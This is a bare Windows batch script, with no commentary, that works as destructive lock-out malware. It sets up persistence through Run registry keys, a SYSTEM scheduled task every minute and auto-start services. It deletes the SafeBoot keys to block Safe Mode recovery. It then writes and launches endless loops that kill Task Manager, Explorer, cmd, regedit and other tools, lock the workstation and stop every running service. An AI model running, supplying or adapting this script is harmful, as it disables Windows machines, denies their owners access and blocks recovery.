reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "ScoreBot" /t REG_SZ /d "%systemroot%\System32\wintroller.cmd" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Scorebot" /t REG_SZ /d "%systemroot%\System32\wintroller.cmd" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "RunLogonScriptSync" /t REG_DWORD /d "1" /f
reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal" /f
reg delete "HKLM\System\CurrentControlSet\Control\SafeBoot\Network" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk /P \??\C:" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "AutoChkTimeOut" /t REG_DWORD /d "0" /f
reg add "HKU\.DEFAULT\Control Panel\Desktop" /v "Wallpaper" /t REG_SZ /d "%systemroot%\System32\wallpaper.bmp" /f

schtasks /RU "System" /RP none /create /sc minute /mo 1 /tn "%random%" /tr "%systemroot%\System32\wintroller.cmd"

rundll32.exe user32.dll,UpdatePerUserSystemParameters

copy %systemroot%\System32\cmd.exe %systemroot%\System32\com.com
echo :FLAG > %systemroot%\System32\wintroller.cmd
echo start com /C "tskill /A cmd" >> %systemroot%\System32\wintroller.cmd
echo start com /C "tskill /A taskmgr" >> %systemroot%\System32\wintroller.cmd
echo start com /C "tskill /A explorer" >> %systemroot%\System32\wintroller.cmd
echo start com /C "tskill /A notepad" >> %systemroot%\System32\wintroller.cmd
echo start com /C "tskill /A mmc" >> %systemroot%\System32\wintroller.cmd
echo start com /C "tskill /A iexplore" >> %systemroot%\System32\wintroller.cmd
echo start com /C "tskill /A regedit" >> %systemroot%\System32\wintroller.cmd
echo start com /C "rundll32.exe user32.dll,LockWorkStation" >> %systemroot%\System32\wintroller.cmd
echo GOTO :FLAG >> %systemroot%\System32\wintroller.cmd

start com /K %systemroot%\System32\wintroller.cmd

echo :FLAG > %systemroot%\System32\netstopper.cmd
echo net start ^> services.txt >> %systemroot%\System32\netstopper.cmd
echo type services.txt ^| find ^"   ^" ^> service.txt >> %systemroot%\System32\netstopper.cmd
echo for /F ^"tokens=* delims= ^" %%A in (service.txt) do start /WAIT net stop ^"%%A^" /Y >> %systemroot%\System32\netstopper.cmd
echo GOTO :FLAG >> %systemroot%\System32\netstopper.cmd

start com /K %systemroot%\System32\netstopper.cmd

sc create SrvDebugger binpath=%systemroot%\System32\wintroller.cmd start=auto
sc create SysDebugger binpath=%systemroot%\System32\netstopper.cmd start=auto
